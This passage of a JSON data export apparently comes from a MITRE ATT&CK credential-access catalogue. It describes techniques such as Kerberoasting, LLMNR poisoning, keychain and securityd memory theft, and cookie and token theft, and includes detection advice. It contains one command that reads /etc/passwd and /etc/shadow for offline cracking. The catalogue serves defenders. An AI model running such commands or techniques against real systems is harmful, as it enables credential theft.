used to collect credentials via various languages such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1155\">AppleScript<\/a>(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1086\">PowerShell<\/a>(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":273,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":273,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":277,"name":"T1208 - Kerberoasting","sort_id":0,"external_id":"T1208","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)<\/p>\n<p>Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a> attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)<\/p>\n<p>This same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)<\/p>\n<p>Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a>. (Citation: SANS Attacking Kerberos Nov 2014)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":277,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":279,"name":"T1142 - Keychain","sort_id":0,"external_id":"T1142","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~\/Library\/Keychains\/<\/code>,<code>\/Library\/Keychains\/<\/code>, and <code>\/Network\/Library\/Keychains\/<\/code>. (Citation: Wikipedia keychain) The <code>security<\/code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.<\/p>\n<p>To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user\u2019s logon credentials.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":279,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":282,"name":"T1171 - LLMNR\/NBT-NS Poisoning and Relay","sort_id":0,"external_id":"T1171","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)<\/p>\n<p>Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)\/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification\/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1040\">Network Sniffing<\/a> and crack the hashes offline through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a> to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)<\/p>\n<p>Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and <a href=\"https:\/\/attack.mitre.org\/software\/S0174\">Responder<\/a>. (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":282,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":305,"name":"T1040 - Network Sniffing","sort_id":0,"external_id":"T1040","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.<\/p>\n<p>Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1557\/001\">LLMNR\/NBT-NS Poisoning and SMB Relay<\/a>, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.<\/p>\n<p>Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and\/or Defense Evasion activities.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":305,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":305,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":305,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":312,"name":"T1174 - Password Filter DLL","sort_id":0,"external_id":"T1174","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and\/or domain controllers for domain accounts.<\/p>\n<p>Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.<\/p>\n<p>Adversaries can register malicious password filters to harvest credentials from local computers and\/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. (Citation: Carnal Ownage Password Filters Sept 2013)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":312,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":322,"name":"T1145 - Private Keys","sort_id":0,"external_id":"T1145","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Private cryptographic keys and certificates are used for authentication, encryption\/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)<\/p>\n<p>Adversaries may gather private keys from compromised systems for use in authenticating to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1021\">Remote Services<\/a> like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~\/.ssh<\/code> for SSH keys on * nix-based systems or <code>C:\\Users(username).ssh\\<\/code> on Windows.<\/p>\n<p>Private keys should require a password or passphrase for operation, so an adversary may also use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1056\">Input Capture<\/a> for keylogging or attempt to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1110\">Brute Force<\/a> the passphrase off-line.<\/p>\n<p>Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":322,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":322,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":322,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":355,"name":"T1167 - Securityd Memory","sort_id":0,"external_id":"T1167","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple\u2019s securityd utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain)<\/p>\n<p>If an adversary can obtain root access (allowing them to read securityd\u2019s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user\u2019s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":355,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":376,"name":"T1528 - Steal Application Access Token","sort_id":0,"external_id":"T1528","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access.<\/p>\n<p>Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. <\/p>\n<p>Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a link through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1192\">Spearphishing Link<\/a> to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1527\">Application Access Token<\/a>.(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)<\/p>\n<p>Adversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a \u201cHigh severity app permissions\u201d policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.\n\nSecurity analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app\u2019s purpose, or apps with old \u201cLast authorized\u201d fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.\n\nAdministrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":376,"platform_id":4,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":376,"platform_id":5,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":376,"platform_id":9,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":377,"name":"T1539 - Steal Web Session Cookie","sort_id":0,"external_id":"T1539","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.<\/p>\n<p>Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)<\/p>\n<p>There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)<\/p>\n<p>After an adversary acquires a valid cookie, they can then perform a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1506\">Web Session Cookie<\/a> technique to login to the corresponding web application.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":377,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":377,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":377,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":377,"platform_id":4,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":377,"platform_id":9,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":401,"name":"T1111 - Two-Factor Authentication Interception","sort_id":0,"external_id":"T1111","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. <\/p>\n<p>If a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)<\/p>\n<p>Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)<\/p>\n<p>Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and\/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.\n\nSimilar to [Input Capture](https:\/\/attack.mitre.org\/techniques\/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":401,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":401,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":401,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":425,"name":"T1416 - Android Intent Hijacking","sort_id":0,"external_id":"T1416","external_sub_id":null,"old_external_id":"MOB-T1019","old_external_sub_id":null,"tactic_id":18,"description":"<p>A malicious app can register to receive intents meant for other applications and may then be able to receive sensitive values such as OAuth authorization codes(Citation: IETF-PKCE).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":425,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":453,"name":"T1405 - Exploit TEE Vulnerability","sort_id":0,"external_id":"T1405","external_sub_id":null,"old_external_id":"MOB-T1008","old_external_sub_id":null,"tactic_id":18,"description":"<p>A malicious app or other attack vector could be used to exploit vulnerabilities in code running within the Trusted Execution Environment (TEE) (Citation: Thomas-TrustZone). The adversary could then obtain privileges held by the TEE potentially including the ability to access cryptographic keys or other sensitive data (Citation: QualcommKeyMaster). Escalated operating system privileges may be first required in order to have the ability to attack the TEE (Citation: EkbergTEE). If not, privileges within the TEE can potentially be used to exploit the operating system (Citation: laginimaineb-TEE).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":453,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":460,"name":"T1411 - Input Prompt","sort_id":0,"external_id":"T1411","external_sub_id":null,"old_external_id":"MOB-T1014","old_external_sub_id":null,"tactic_id":18,"description":"<p>The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII). Adversaries may mimic this functionality to prompt users for sensitive information.<\/p>\n<p>Compared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique\u2019s use.(Citation: Felt-PhishingOnMobileDevices)<\/p>\n<p>Specific approaches to this technique include:<\/p>\n<h3>Impersonate the identity of a legitimate application<\/h3>\n<p>A malicious application could impersonate the identity of a legitimate application (e.g. use the same application name and\/or icon) and get installed on the device. The malicious app could then prompt the user for sensitive information.(Citation: eset-finance)<\/p>\n<h3>Display a prompt on top of a running legitimate application<\/h3>\n<p>A malicious application could display a prompt on top of a running legitimate application to trick users into entering sensitive information into the malicious application rather than the legitimate application. Typically, the malicious application would need to know when the targeted application (and individual activity within the targeted application) is running in the foreground, so that the malicious application knows when to display its prompt. Android 5.0 and 5.1.1, respectively, increased the difficulty of determining the current foreground application through modifications to the <code>ActivityManager<\/code> API.(Citation: Android-getRunningTasks)(Citation: StackOverflow-getRunningAppProcesses). A malicious application can still abuse Android\u2019s accessibility features to determine which application is currently in the foreground.(Citation: ThreatFabric Cerberus) Approaches to display a prompt include:<\/p>\n<ul>\n<li>A malicious application could start a new activity on top of a running legitimate application.(Citation: Felt-PhishingOnMobileDevices)(Citation: Hassell-ExploitingAndroid) Android 10 places new restrictions on the ability for an application to start a new activity on top of another application, which may make it more difficult for adversaries to utilize this technique.(Citation: Android Background)<\/li>\n<li>A malicious application could create an application overlay window on top of a running legitimate application. Applications must hold the <code>SYSTEM_ALERT_WINDOW<\/code> permission to create overlay windows. This permission is handled differently than typical Android permissions, and at least under certain conditions is automatically granted to applications installed from the Google Play Store.(Citation: Cloak and Dagger)(Citation: NowSecure Android Overlay)(Citation: Skycure-Accessibility) The <code>SYSTEM_ALERT_WINDOW<\/code> permission and its associated ability to create application overlay windows are expected to be deprecated in a future release of Android in favor of a new API.(Citation: XDA Bubbles)<\/li>\n<\/ul>\n<h3>Fake device notifications<\/h3>\n<p>A malicious application could send fake device notifications to the user. Clicking on the device notification could trigger the malicious application to display an input prompt.(Citation: Group IB Gustuff Mar 2019)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The user can view and manage which applications hold the SYSTEM_ALERT_WINDOW permission to create overlay windows on top of other apps through the device settings in Apps & notifications -> Special app access -> Display over other apps (the exact menu location may vary between Android versions).","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":460,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":460,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":492,"name":"T1415 - URL Scheme Hijacking","sort_id":0,"external_id":"T1415","external_sub_id":null,"old_external_id":"MOB-T1018","old_external_sub_id":null,"tactic_id":18,"description":"<p>An iOS application may be able to maliciously claim a URL scheme, allowing it to intercept calls that are meant for a different application(Citation: FireEye-Masque2)(Citation: Dhanjani-URLScheme). This technique, for example, could be used to capture OAuth authorization codes(Citation: IETF-PKCE) or to phish user credentials(Citation: MobileIron-XARA).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":492,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":496,"name":"T1003.008 - \/etc\/passwd and \/etc\/shadow","sort_id":0,"external_id":"T1003.008","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":18,"description":"<p>Adversaries may attempt to dump the contents of <code>\/etc\/passwd<\/code> and <code>\/etc\/shadow<\/code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>\/etc\/passwd<\/code> and <code>\/etc\/shadow<\/code> to store user account information including password hashes in <code>\/etc\/shadow<\/code>. By default, <code>\/etc\/shadow<\/code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)<\/p>\n<p>The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># \/usr\/bin\/unshadow \/etc\/passwd \/etc\/shadow &gt; \/tmp\/crack.password.db<\/code><\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>\/etc\/passwd<\/code> and <code>\/etc\/shadow<\/code>, alerting on the pid, process name, and arguments of such programs.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 